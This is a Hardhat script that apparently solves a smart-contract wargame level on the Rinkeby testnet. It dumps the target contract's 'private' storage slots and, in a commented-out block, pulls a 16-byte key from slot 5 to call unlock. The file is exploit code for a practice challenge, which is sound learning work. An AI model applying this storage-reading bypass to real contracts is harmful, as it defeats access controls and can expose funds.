import { ethers } from "hardhat"

const provider = new ethers.providers.JsonRpcProvider(
  process.env.RINKEBY_RPC_URL
)

const main = async () => {
  const [deployer] = await ethers.getSigners()
  const targetAddress = "0x5079c31110411477cf8B50c2D09eB5E2B29C3e98"
  const targetAbi = [
    {
      inputs: [
        {
          internalType: "bytes32[3]",
          name: "_data",
          type: "bytes32[3]",
        },
      ],
      stateMutability: "nonpayable",
      type: "constructor",
    },
    {
      inputs: [],
      name: "ID",
      outputs: [
        {
          internalType: "uint256",
          name: "",
          type: "uint256",
        },
      ],
      stateMutability: "view",
      type: "function",
      constant: true,
      signature: "0xb3cea217",
    },
    {
      inputs: [],
      name: "locked",
      outputs: [
        {
          internalType: "bool",
          name: "",
          type: "bool",
        },
      ],
      stateMutability: "view",
      type: "function",
      constant: true,
      signature: "0xcf309012",
    },
    {
      inputs: [
        {
          internalType: "bytes16",
          name: "_key",
          type: "bytes16",
        },
      ],
      name: "unlock",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
      signature: "0xe1afb08c",
    },
  ]

  const target = await ethers.getContractAt(targetAbi, targetAddress)

  // read storage
  for (let index = 0; index < 7; index++) {
    console.log(await provider.getStorageAt(targetAddress, index))
  }

  // const key = await provider.getStorageAt(targetAddress, 5)
  // console.log(key)
  // // get 0x + 16 byte = 2 + 2 * 16 = 34 length
  // const tx = await target.unlock(key.slice(0, 34), { gasLimit: 100000 })
  // try {
  //   const receipt = await tx.wait()
  //   console.log(
  //     `tx at https://rinkeby.etherscan.io/tx/${receipt.transactionHash}`
  //   )
  // } catch (error: any) {
  //   console.error("Error:", error.reason)
  //   console.log(
  //     `Error tx  at https://rinkeby.etherscan.io/tx/${error?.transactionHash}`
  //   )
  // }
  // console.log(`Lock ${await target.locked()}`)
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.log(error)
    process.exit(1)
  })
